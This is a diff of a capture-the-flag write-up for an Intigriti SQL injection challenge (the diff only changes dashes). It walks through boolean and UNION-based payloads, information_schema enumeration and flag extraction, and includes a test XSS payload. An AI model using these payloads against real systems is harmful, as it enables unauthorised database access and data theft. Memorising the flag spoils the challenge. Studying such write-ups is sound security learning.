@@ -1,4 +1,4 @@
-# Intigriti September 2026 Challenge — Write-up
+# Intigriti September 2026 Challenge - Write-up
 
 > **Challenge:** [Critter Gallery](https://challenge-0926.challenges.intigriti.io/challenge.php) · **Author:** [@khanhdlq](https://x.com/khanhdlq) · **Category:** SQL Injection · **Flag:** `INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}`
 
@@ -8,11 +8,11 @@ A base64-encoded `pic` query parameter is decoded and concatenated directly into
 
 ---
 
-## 1 — Reconnaissance
+## 1 - Reconnaissance
 
-The challenge page at `/challenge.php` is a cute "Critter Gallery" — eight animal tiles, each linking to a detail view via `?pic=<base64>`:
+The challenge page at `/challenge.php` is a cute "Critter Gallery" - eight animal tiles, each linking to a detail view via `?pic=<base64>`:
 
-![Gallery baseline — the fox detail card](images/01_baseline_fox.png)
+![Gallery baseline - the fox detail card](images/01_baseline_fox.png)
 
 The `pic` value decodes to a plain animal name: `Zm94` → `fox`, `cGFuZGE=` → `panda`, etc. Clicking a tile loads a detail card with three pieces of data:
 
@@ -28,7 +28,7 @@ An invalid name (any string not matching a known animal) shows the default paint
 
 ---
 
-## 2 — Spotting the normalisation differential
+## 2 - Spotting the normalisation differential
 
 Before breaking anything, I tested how the application handles case variations of a known name:
 
@@ -39,13 +39,13 @@ Before breaking anything, I tested how the application handles case variations o
 | `Fox` | 🖼️ (default) | ✅ fox's description |
 | `fOX` | 🖼️ (default) | ✅ fox's description |
 
-The emoji only appears for the **exact** lowercase name — it's a case-sensitive lookup, likely a PHP array (`$emojis['fox']`).
+The emoji only appears for the **exact** lowercase name - it's a case-sensitive lookup, likely a PHP array (`$emojis['fox']`).
 
-But the description is returned regardless of case. That's the tell: **case-insensitive string matching is the default behaviour of a MySQL `utf8mb4_..._ci` collation**. Two different normalisation strategies mean two different backends — the emoji comes from application code, but the description is resolved by a SQL query.
+But the description is returned regardless of case. That's the tell: **case-insensitive string matching is the default behaviour of a MySQL `utf8mb4_..._ci` collation**. Two different normalisation strategies mean two different backends - the emoji comes from application code, but the description is resolved by a SQL query.
 
 ---
 
-## 3 — Breaking the query
+## 3 - Breaking the query
 
 If the decoded name goes into a SQL query, a single quote should break it. Let's try:
 
@@ -62,31 +62,31 @@ curl -s -o /dev/null -w "code=%{http_code} size=%{size_download}\n" \
 code=200 size=0
 ```
 
-**HTTP 200 with a zero-byte body** — not a WAF block, not a validation error page, but a silent crash. This is what an uncaught PDO exception looks like when `display_errors` is off. The backslash `\` also triggers the same empty response, while every non-special character returns a normal page.
+**HTTP 200 with a zero-byte body** - not a WAF block, not a validation error page, but a silent crash. This is what an uncaught PDO exception looks like when `display_errors` is off. The backslash `\` also triggers the same empty response, while every non-special character returns a normal page.
 
 That's strong evidence: the decoded `pic` value is concatenated into a SQL string literal without escaping.
 
 ---
 
-## 4 — Confirming the injection
+## 4 - Confirming the injection
 
 ### Boolean differential
 
 The classic test: inject a condition that is true, then one that is false, and observe the difference.
 
-**True condition** — `fox' AND '1'='1`:
+**True condition** - `fox' AND '1'='1`:
 
-![Boolean TRUE — fox's description is returned](images/02_bool_true.png)
+![Boolean TRUE - fox's description is returned](images/02_bool_true.png)
 
-Fox's description is displayed — the query returns a row.
+Fox's description is displayed - the query returns a row.
 
-**False condition** — `fox' AND '1'='2`:
+**False condition** - `fox' AND '1'='2`:
 
-![Boolean FALSE — no description returned](images/03_bool_false.png)
+![Boolean FALSE - no description returned](images/03_bool_false.png)
 
-*"No critter goes by that name yet."* — the injected `AND` clause made the `WHERE` false, so no row came back.
+*"No critter goes by that name yet."* - the injected `AND` clause made the `WHERE` false, so no row came back.
 
-This confirms classic **string-based SQL injection** — we control the WHERE clause.
+This confirms classic **string-based SQL injection** - we control the WHERE clause.
 
 ### UNION proof
 
@@ -96,7 +96,7 @@ To prove we can inject entirely new result rows:
 fox' UNION SELECT 'INJECTED-BY-UNION
 ```
 
-![UNION proof — attacker-controlled text appended to the description](images/04_union_proof.png)
+![UNION proof - attacker-controlled text appended to the description](images/04_union_proof.png)
 
 The real fox description appears, followed by our injected string `INJECTED-BY-UNION` on the next line. The underlying query is therefore:
 
@@ -104,17 +104,17 @@ The real fox description appears, followed by our injected string `INJECTED-BY-U
 SELECT description FROM animals WHERE name = '<decoded pic>'
 ```
 
-It's a **single-column SELECT** — a two-column `UNION SELECT '1','2` returns the zero-byte error (column count mismatch). This means every extraction payload must project exactly one column, and `GROUP_CONCAT()` is needed to pull multiple values through that single slot.
+It's a **single-column SELECT** - a two-column `UNION SELECT '1','2` returns the zero-byte error (column count mismatch). This means every extraction payload must project exactly one column, and `GROUP_CONCAT()` is needed to pull multiple values through that single slot.
 
 ---
 
-## 5 — Fingerprinting the database
+## 5 - Fingerprinting the database
 
 ```sql
 x' UNION SELECT CONCAT(@@version,' / ',database(),' / ',user())-- -
 ```
 
-![Database fingerprint — MySQL 8.0.46, database critter_gallery, user gallery](images/05_version_db_user.png)
+![Database fingerprint - MySQL 8.0.46, database critter_gallery, user gallery](images/05_version_db_user.png)
 
 | Property | Value |
 |---|---|
@@ -122,11 +122,11 @@ x' UNION SELECT CONCAT(@@version,' / ',database(),' / ',user())-- -
 | Database | `critter_gallery` |
 | User | `gallery@10.18.49.50` |
 
-> **Note on comment syntax:** MySQL's `--` comment requires a trailing space to be recognised. A bare `fox'--` (no space) triggers a parse error and returns the zero-byte crash page. Using `-- -` (dash-dash-space-dash) is a reliable workaround — the extra `-` is just filler after the space.
+> **Note on comment syntax:** MySQL's `--` comment requires a trailing space to be recognised. A bare `fox'--` (no space) triggers a parse error and returns the zero-byte crash page. Using `-- -` (dash-dash-space-dash) is a reliable workaround - the extra `-` is just filler after the space.
 
 ---
 
-## 6 — Enumerating the schema
+## 6 - Enumerating the schema
 
 ### Tables
 
@@ -136,9 +136,9 @@ x' UNION SELECT (SELECT GROUP_CONCAT(table_name)
                  WHERE table_schema=database())-- -
 ```
 
-![Table enumeration — animals, secret_vault](images/06_tables.png)
+![Table enumeration - animals, secret_vault](images/06_tables.png)
 
-Two tables: `animals` (the gallery data) and **`secret_vault`** — a table that no feature of the application exposes.
+Two tables: `animals` (the gallery data) and **`secret_vault`** - a table that no feature of the application exposes.
 
 ### Columns of `secret_vault`
 
@@ -149,7 +149,7 @@ x' UNION SELECT (SELECT GROUP_CONCAT(table_name,'.',column_name,' ',column_type)
                  AND table_name='secret_vault')-- -
 ```
 
-![Column enumeration — secret_vault.id int, secret_vault.note varchar(255)](images/07_columns.png)
+![Column enumeration - secret_vault.id int, secret_vault.note varchar(255)](images/07_columns.png)
 
 | Column | Type |
 |---|---|
@@ -158,13 +158,13 @@ x' UNION SELECT (SELECT GROUP_CONCAT(table_name,'.',column_name,' ',column_type)
 
 ---
 
-## 7 — Extracting the flag
+## 7 - Extracting the flag
 
 ```sql
 x' UNION SELECT note FROM secret_vault-- -
 ```
 
-![Flag extracted — INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}](images/08_FLAG.png)
+![Flag extracted - INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}](images/08_FLAG.png)
 
 ```
 INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}
@@ -216,20 +216,20 @@ The output:
 <div class="desc">&lt;img src=x onerror=alert(document.domain)&gt;<br></div>
 ```
 
-Both the `<h2>` name and the `<div class="desc">` description pass through `htmlspecialchars()` — all `<`, `>`, `"`, and `&` are entity-encoded. **There is no XSS here.** The challenge is purely about SQL injection: the flag lives in the database, not in a JavaScript execution context.
+Both the `<h2>` name and the `<div class="desc">` description pass through `htmlspecialchars()` - all `<`, `>`, `"`, and `&` are entity-encoded. **There is no XSS here.** The challenge is purely about SQL injection: the flag lives in the database, not in a JavaScript execution context.
 
 ---
 
 ## Key observations
 
-- **The initial tell was behavioural, not syntactic.** The case-sensitivity differential between the emoji lookup and the description lookup revealed that two different systems resolve the same input — and a case-insensitive one in a PHP app almost always means a database query with a `_ci` collation.
+- **The initial tell was behavioural, not syntactic.** The case-sensitivity differential between the emoji lookup and the description lookup revealed that two different systems resolve the same input - and a case-insensitive one in a PHP app almost always means a database query with a `_ci` collation.
 
-- **The zero-byte crash page is the canary.** Instead of a 500 or a visible error, the application returns HTTP 200 with an empty body on SQL errors. This is easy to miss if you're only looking at status codes — you need to check `Content-Length: 0` or the actual response size.
+- **The zero-byte crash page is the canary.** Instead of a 500 or a visible error, the application returns HTTP 200 with an empty body on SQL errors. This is easy to miss if you're only looking at status codes - you need to check `Content-Length: 0` or the actual response size.
 
 - **Single-column constraint forces `GROUP_CONCAT()`.** The underlying `SELECT` projects only one column (`description`), so a `UNION` can only inject one column. Multi-value extractions need `GROUP_CONCAT()` to serialise them into a single string.
 
-- **MySQL comment syntax gotcha.** `--` alone is not a valid comment terminator in MySQL — it needs a trailing space. `-- -` is the standard workaround (`--[space][anything]`). Using `#` also works but can be URL-interpreted; `-- -` is safer in a URL context.
+- **MySQL comment syntax gotcha.** `--` alone is not a valid comment terminator in MySQL - it needs a trailing space. `-- -` is the standard workaround (`--[space][anything]`). Using `#` also works but can be URL-interpreted; `-- -` is safer in a URL context.
 
 ---
 
-*Challenge by [@khanhdlq](https://x.com/khanhdlq) for [Intigriti](https://www.intigriti.com/) — September 2026*
+*Challenge by [@khanhdlq](https://x.com/khanhdlq) for [Intigriti](https://www.intigriti.com/) - September 2026*
